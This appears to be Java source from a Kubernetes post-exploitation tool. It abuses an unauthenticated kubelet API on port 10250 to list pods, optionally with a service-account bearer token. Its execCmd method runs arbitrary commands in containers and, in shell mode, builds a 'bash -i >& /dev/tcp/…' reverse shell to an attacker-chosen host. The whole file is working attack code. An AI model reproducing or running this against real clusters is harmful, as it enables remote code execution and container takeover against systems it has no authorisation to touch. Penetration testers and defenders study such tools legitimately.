package post;

import JOBO.CurrentHost;
import kong.unirest.HttpResponse;
import kong.unirest.json.JSONArray;
import kong.unirest.json.JSONObject;
import util.HttpUtil;

import javax.net.ssl.HttpsURLConnection;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;


public class KubeletApiOption {

    public static boolean getPods(CurrentHost currentHost,boolean responseData){
        if (currentHost.isKubeletAPIUnauth()){
            JSONObject json;
            String token = currentHost.getSAToken();
            String ip = currentHost.getNodeIP();
            try {
                if (Objects.equals(token, "") || token.isEmpty()){
                    json = HttpUtil.getJson("https://" + ip + ":10250/pods/", null);
                }else {
                    Map<String,String> map = new HashMap<>();
                    map.put("Authorization","Bearer " + token);
                    json = HttpUtil.getJson("https://" + ip + ":10250/pods/", map);
                }
            }catch (Exception e){
                e.printStackTrace();
                return false;
            }
            if (responseData){
                System.out.println(json.toString());
            }else {
                JSONArray items = json.getJSONArray("items");
                System.out.println("namespace\tpodName\tcontainerName\tpodIP\tstatus");
                int length = items.length();
                if (!(length == 0)){
                    for (int i = 0; i < length; i++) {
                        JSONObject pod = items.getJSONObject(i);
                        JSONArray containers = pod.getJSONObject("spec").getJSONArray("containers");
                        if (!(containers.isEmpty())){
                            for (int j = 0; j < containers.length(); j++) {
                                String containerName = containers.getJSONObject(j).getString("name");
                                System.out.println(pod.getJSONObject("metadata").getString("namespace")+"\t"+pod.getJSONObject("metadata").getString("name")+"\t"+containerName+"\t"+pod.getJSONObject("status").getString("podIP")+"\t"+pod.getJSONObject("status").getString("phase"));
                            }
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }

    public static boolean execCmd(CurrentHost currentHost,String namespace,String podName,String containerName,String cmd,boolean shell,String shellip) throws UnsupportedEncodingException {
        if (currentHost.isKubeletAPIUnauth()){
            HttpResponse<String> response;
            String token = currentHost.getSAToken();
            String ip = currentHost.getNodeIP();
            String url = namespace+"/"+podName+"/"+containerName;
            String param = "";
            shellip = shellip.replaceAll(":","/");
            if (!shell && cmd.isEmpty()){
                return false;
            }
            if (shell){
                shellip = "bash -i >& /dev/tcp/"+ shellip +" 0>&1";
                String encode = URLEncoder.encode(shellip, "UTF-8");
                param = "?command=bash&command=-c&command=" + encode + "&stdout=1&stderr=1";
            }else {
                String[] s = cmd.split(" ");
                param = "?";
                for (String command : s) {
                    param += "command=" + command + "&";
                }
                param += "stdout=1&stderr=1";
            }
            try {
                if (Objects.equals(token, "") || token.isEmpty()){
                    response = HttpUtil.postString("https://" + ip + ":10250/" + url + param, null,"");
                }else {
                    Map<String,String> map = new HashMap<>();
                    map.put("Authorization","Bearer " + token);
                    response = HttpUtil.postString("https://" + ip + ":10250/" + url + param, map,"");
                }
                System.out.println(response.getStatus());
                System.out.println(response.getBody());
                return true;
            }catch (Exception e){
                e.printStackTrace();
                return false;
            }
        }
        return false;
    }


}
